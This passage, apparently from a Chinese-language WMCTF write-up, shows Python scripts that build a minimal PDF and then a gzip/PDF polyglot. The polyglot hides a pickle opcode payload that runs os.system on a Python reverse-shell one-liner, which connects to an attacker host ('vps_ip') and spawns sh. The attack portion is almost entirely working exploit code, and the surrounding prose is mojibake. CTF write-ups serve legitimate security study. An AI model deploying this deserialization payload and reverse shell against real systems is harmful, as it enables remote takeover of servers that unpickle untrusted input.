</span></span><span class=line><span class=cl>        <span class=mi>3</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;&lt;&lt; /Type /Page /Parent 2 0 R &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/MediaBox [0 0 612 792] &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/Resources &lt;&lt; /Font &lt;&lt; /F1 4 0 R &gt;&gt; &gt;&gt; &#34;</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;/Contents 5 0 R &gt;&gt;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Ensure ordering: add page after fonts and content so refs exist</span>
</span></span><span class=line><span class=cl>    <span class=n>objects</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>page_dict</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Start writing file</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;%PDF-1.4</span><span class=se>\n</span><span class=s2>%</span><span class=se>\xE2\xE3\xCF\xD3\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>offsets</span><span class=p>:</span> <span class=nb>dict</span><span class=p>[</span><span class=nb>int</span><span class=p>,</span> <span class=nb>int</span><span class=p>]</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Write each object, record offsets</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>obj_id</span><span class=p>,</span> <span class=n>obj_body</span> <span class=ow>in</span> <span class=n>objects</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>offsets</span><span class=p>[</span><span class=n>obj_id</span><span class=p>]</span> <span class=o>=</span> <span class=n>w</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>obj_id</span><span class=si>}</span><span class=s2> 0 obj</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span><span class=p>(</span><span class=n>obj_body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>endobj</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># xref</span>
</span></span><span class=line><span class=cl>    <span class=n>startxref</span> <span class=o>=</span> <span class=n>bio</span><span class=o>.</span><span class=n>tell</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>max_obj</span> <span class=o>=</span> <span class=nb>max</span><span class=p>(</span><span class=n>offsets</span><span class=p>)</span> <span class=k>if</span> <span class=n>offsets</span> <span class=k>else</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=c1># xref table requires a free entry 0</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;xref</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;0 </span><span class=si>{</span><span class=n>max_obj</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># object 0 free</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;0000000000 65535 f </span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>max_obj</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>off</span> <span class=o>=</span> <span class=n>offsets</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>w</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>off</span><span class=si>:</span><span class=s2>010d</span><span class=si>}</span><span class=s2> 00000 n </span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># trailer</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=sa>b</span><span class=s2>&#34;trailer</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&lt;&lt; &#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=sa>f</span><span class=s2>&#34;/Size </span><span class=si>{</span><span class=n>max_obj</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s2> &#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;/Root 1 0 R &#34;</span>
</span></span><span class=line><span class=cl>            <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;&gt;&gt;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;startxref</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>startxref</span><span class=si>}</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=si>%%</span><span class=s2>EOF</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>bio</span><span class=o>.</span><span class=n>getvalue</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>out_dir</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>dirname</span><span class=p>(</span><span class=vm>__file__</span><span class=p>),</span> <span class=n>os</span><span class=o>.</span><span class=n>pardir</span><span class=p>,</span> <span class=s2>&#34;samples&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out_dir</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>abspath</span><span class=p>(</span><span class=n>out_dir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>out_dir</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>out_dir</span><span class=p>,</span> <span class=s2>&#34;debug_ops.pdf&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>build_pdf_bytes</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>out_path</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;PDF written:&#34;</span><span class=p>,</span> <span class=n>out_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>),</span> <span class=s2>&#34;bytes&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>out_path</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>ç”Ÿæˆæ¶æ„opcode, è¿™ä¸€æ­¥ç›´æ¥æ‹·æ‰“aiè¿­ä»£å‡ºæ¥</p><p>genOpcode.py:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_minimal_pdf</span><span class=p>(</span><span class=n>base_offset</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=mi>0</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Build a minimal valid PDF with absolute xref offsets accounting for base_offset</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;%PDF-1.4</span><span class=se>\n</span><span class=s2>%</span><span class=se>\xE2\xE3\xCF\xD3\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>obj1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;&#34;1 0 obj
</span></span></span><span class=line><span class=cl><span class=s2>&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>endobj
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>obj2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;&#34;2 0 obj
</span></span></span><span class=line><span class=cl><span class=s2>&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>endobj
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>obj3</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;&#34;3 0 obj
</span></span></span><span class=line><span class=cl><span class=s2>&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R &gt;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>endobj
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\r</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>stream_body</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;Hello WMCTF!&#34;</span>  <span class=c1># small visible text</span>
</span></span><span class=line><span class=cl>    <span class=n>obj4</span> <span class=o>=</span> <span class=p>(</span><span class=sa>b</span><span class=s2>&#34;4 0 obj</span><span class=se>\n</span><span class=s2>&lt;&lt; /Length </span><span class=si>%d</span><span class=s2> &gt;&gt;</span><span class=se>\n</span><span class=s2>stream</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>stream_body</span><span class=p>))</span> <span class=o>+</span> <span class=n>stream_body</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>endstream</span><span class=se>\n</span><span class=s2>endobj</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Build PDF body and record absolute offsets</span>
</span></span><span class=line><span class=cl>    <span class=n>pdf</span> <span class=o>=</span> <span class=n>header</span>
</span></span><span class=line><span class=cl>    <span class=n>abs_offsets</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>obj</span> <span class=ow>in</span> <span class=p>(</span><span class=n>obj1</span><span class=p>,</span> <span class=n>obj2</span><span class=p>,</span> <span class=n>obj3</span><span class=p>,</span> <span class=n>obj4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>abs_offsets</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>base_offset</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>pdf</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>pdf</span> <span class=o>+=</span> <span class=n>obj</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># xref and trailer with absolute positions</span>
</span></span><span class=line><span class=cl>    <span class=n>xref_abs_offset</span> <span class=o>=</span> <span class=n>base_offset</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=n>pdf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>xref_lines</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;xref&#34;</span><span class=p>,</span> <span class=s2>&#34;0 5&#34;</span><span class=p>,</span> <span class=s2>&#34;0000000000 65535 f &#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>off</span> <span class=ow>in</span> <span class=n>abs_offsets</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>xref_lines</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>off</span><span class=si>:</span><span class=s2>010d</span><span class=si>}</span><span class=s2> 00000 n &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>xref</span> <span class=o>=</span> <span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>xref_lines</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>trailer</span> <span class=o>=</span> <span class=p>(</span><span class=s2>&#34;trailer</span><span class=se>\n</span><span class=s2>&lt;&lt; /Size 5 /Root 1 0 R &gt;&gt;</span><span class=se>\n</span><span class=s2>startxref</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>xref_abs_offset</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=si>%%</span><span class=s2>EOF</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pdf</span> <span class=o>+</span> <span class=n>xref</span> <span class=o>+</span> <span class=n>trailer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>build_gzip_with_extra</span><span class=p>(</span><span class=n>extra_bytes</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>payload_bytes</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># GZIP header with FEXTRA holding extra_bytes (uncompressed), then deflate-compressed payload, then CRC/ISIZE</span>
</span></span><span class=line><span class=cl>    <span class=n>ID1</span><span class=p>,</span> <span class=n>ID2</span><span class=p>,</span> <span class=n>CM</span> <span class=o>=</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x8B</span><span class=p>,</span> <span class=mh>0x08</span>
</span></span><span class=line><span class=cl>    <span class=n>FLG</span> <span class=o>=</span> <span class=mh>0x04</span>  <span class=c1># FEXTRA</span>
</span></span><span class=line><span class=cl>    <span class=n>MTIME</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>XFL</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>OS</span> <span class=o>=</span> <span class=mi>255</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>extra_bytes</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mh>0xFFFF</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;extra_bytes too long for GZIP FEXTRA (max 65535)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>ID1</span><span class=p>,</span> <span class=n>ID2</span><span class=p>,</span> <span class=n>CM</span><span class=p>,</span> <span class=n>FLG</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=n>MTIME</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>XFL</span><span class=p>,</span> <span class=n>OS</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>+=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;H&#39;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>extra_bytes</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>header</span> <span class=o>+=</span> <span class=n>extra_bytes</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># raw deflate for payload</span>
</span></span><span class=line><span class=cl>    <span class=n>comp</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>compressobj</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=mi>9</span><span class=p>,</span> <span class=n>wbits</span><span class=o>=-</span><span class=mi>15</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>comp_data</span> <span class=o>=</span> <span class=n>comp</span><span class=o>.</span><span class=n>compress</span><span class=p>(</span><span class=n>payload_bytes</span><span class=p>)</span> <span class=o>+</span> <span class=n>comp</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>crc</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>crc32</span><span class=p>(</span><span class=n>payload_bytes</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=n>isize</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>payload_bytes</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>trailer</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s1>&#39;&lt;II&#39;</span><span class=p>,</span> <span class=n>crc</span><span class=p>,</span> <span class=n>isize</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>header</span> <span class=o>+</span> <span class=n>comp_data</span> <span class=o>+</span> <span class=n>trailer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># When storing PDF in GZIP FEXTRA, the PDF starts at byte offset 12 from file start</span>
</span></span><span class=line><span class=cl>    <span class=n>base_offset</span> <span class=o>=</span> <span class=mi>12</span>  <span class=c1># 10-byte gzip fixed header + 2-byte XLEN</span>
</span></span><span class=line><span class=cl>    <span class=n>pdf_bytes</span> <span class=o>=</span> <span class=n>build_minimal_pdf</span><span class=p>(</span><span class=n>base_offset</span><span class=o>=</span><span class=n>base_offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># payload to be recovered after decompression</span>
</span></span><span class=line><span class=cl>    <span class=n>opcode_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;&#39;(S&#39;python -c </span><span class=se>\&#39;</span><span class=s1>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;vps_ip&#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)</span><span class=se>\&#39;</span><span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>ios
</span></span></span><span class=line><span class=cl><span class=s1>system
</span></span></span><span class=line><span class=cl><span class=s1>.&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>gz_polyglot</span> <span class=o>=</span> <span class=n>build_gzip_with_extra</span><span class=p>(</span><span class=n>extra_bytes</span><span class=o>=</span><span class=n>pdf_bytes</span><span class=p>,</span> <span class=n>payload_bytes</span><span class=o>=</span><span class=n>opcode_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;opcode.gz&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>gz_polyglot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Diagnostics</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>gz_polyglot</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;%PDF-&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;%PDF- found at offset:&#34;</span><span class=p>,</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Total size:&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>gz_polyglot</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Quick local checks</span>
</span></span><span class=line><span class=cl>    <span class=c1># 1) Decompress to verify opcode</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=kn>import</span> <span class=nn>gzip</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>gzip</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>gz_polyglot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Decompressed data:&#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Decompress failed:&#34;</span><span class=p>,</span> <span class=n>e</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2) Basic header preview for PDF</span>
